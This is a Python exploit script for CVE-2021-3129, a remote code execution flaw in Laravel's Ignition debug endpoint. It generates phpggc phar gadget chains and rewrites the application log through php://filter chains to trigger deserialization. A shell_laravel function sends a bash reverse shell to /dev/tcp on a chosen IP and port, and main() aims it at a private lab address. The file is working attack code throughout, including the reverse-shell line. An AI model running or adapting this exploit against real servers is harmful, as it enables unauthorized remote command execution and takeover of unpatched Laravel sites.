# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import contextlib, os
@contextlib.contextmanager
def remember_cwd():
    curdir= os.getcwd()
    try: yield
    finally: os.chdir(curdir)

class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用
    __gadget_chains = {
       
        "Laravel/RCE5":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE5 'system("echo {} | xxd -p -r | /bin/bash");' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" 
        """,
        "Laravel/RCE6":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE6 'system("echo {} | xxd -p -r | /bin/bash");' --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())" 
        """,
    }

    def __vul_check(self):
        res = requests.get(self.__url,verify=False)
        if res.status_code != 405 and "laravel" not in res.text:
            #print("[+]Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        
        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False, timeout=10)
      
            
        #print(res.status_code)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        return self.__payload_send(payload=payload)

    def __generate_payload(self,gadget_chain, ST = False):
        if ST:
            generate_exp = gadget_chain
            
        else: 
            generate_exp = self.__gadget_chains[gadget_chain].format(b"id".hex())
        #print(generate_exp)
        try:
            path = os.path.dirname(os.path.abspath(__file__))
            
            with remember_cwd():
                os.chdir(path) 
                #print(os.getcwd())
                exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'aaa'
                
            #print("[+]exploit:")
            #print(exp)
        except Exception as e:
            print("Error", e)
        return exp

    def __decode_log(self):
        #print("Decode")
        res = self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")
       
        return res

    def __unserialize_log(self):
        res  = self.__payload_send("phar://../storage/logs/laravel.log/test.txt")
        #print(res.status_code)
        from bs4 import BeautifulSoup
        html = BeautifulSoup(res.text, "html.parser")
        #print(html.prettify())
        return res 

    def __rce(self, get_text=False):
        try:
            text = str(self.__unserialize_log().text)
            #print(text)
            if get_text==False:
                text = text[text.index(']'):].replace("}","").replace("]","")
            return text
        except Exception as e:
            if type(e).__name__ == "ConnectionError":
                return "OKkereeeeeeeeeeeeeee"
        return ""
    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():

            #print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            #print("[*] " + gadget_chain + " Result:")
            ans  = self.__rce()
            if len(ans) > 1 and "uid" in ans:
                generate_exp = self.__gadget_chains[gadget_chain]
                return generate_exp
        return False
            #break

    def __init__(self, target):
        self.target = target
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
    def exp_shell(self, gadget_chain, cmd):
        gadget_chain_main = gadget_chain.format(cmd)
        #print("[*] Try to use %s for exploitation." % (gadget_chain_main))
        self.__clear_log()
        self.__clear_log()
        self.__payload_send('A' * 2)
        self.__payload_send(self.__generate_payload(gadget_chain_main, ST = True))
        self.__decode_log()
        #print("[*] " + gadget_chain + " Result:")
        ans = self.__rce(get_text=True)
        return len(ans)< 100
    def check(self, target):
        if not self.__vul_check():
            return False
        return True
    def run(self):
        if not self.__vul_check(): 
            return False
        return self.exp()
def verify_laravel(url):
    data = EXP(url)
    return data.check(url)
def exploit_laravel(url):
    data = EXP(url)
    return data.run()

def shell_laravel(url, input, ip_re, port_re):
    data = EXP(url)
    s = "/bin/bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1';".format(ip_re, port_re)
    cmd =  s.encode().hex()
    return data.exp_shell(input, cmd)
    

def main():
    ans = exploit_laravel("http://192.168.133.1:8888")
    
    shell_laravel("http://192.168.133.1:8888", ans, "192.168.133.1", "4445")
    # EXP(sys.argv[1])

if __name__ == "__main__":
    main()
